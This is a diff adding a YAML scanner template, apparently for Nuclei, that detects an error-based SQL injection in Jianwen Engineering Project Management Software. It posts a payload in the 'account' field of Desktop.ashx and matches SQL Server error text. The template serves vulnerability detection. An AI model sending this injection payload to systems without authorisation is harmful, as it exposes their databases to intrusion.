@@ -1,0 +1,31 @@
+id: poc-yaml-jianwen-engineering-project-management-software-desktop-ashx-sqli
+info:
+  name: Jianwen Engineering Project Management Software SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+http:
+  - raw:
+      - |
+        POST /SysFrame4/Desktop.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        account=1'+and+%01(select @@version)<0--&method=isChangePwd&pwd=
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "microsoft sql server"
+        part: body
+      - type: word
+        words:
+          - "System.Data.SqlClient.SqlException"
+        part: body
+      - type: word
+        words:
+          - "text/plain"
+        part: header
+      - type: status
+        status:
+          - 200
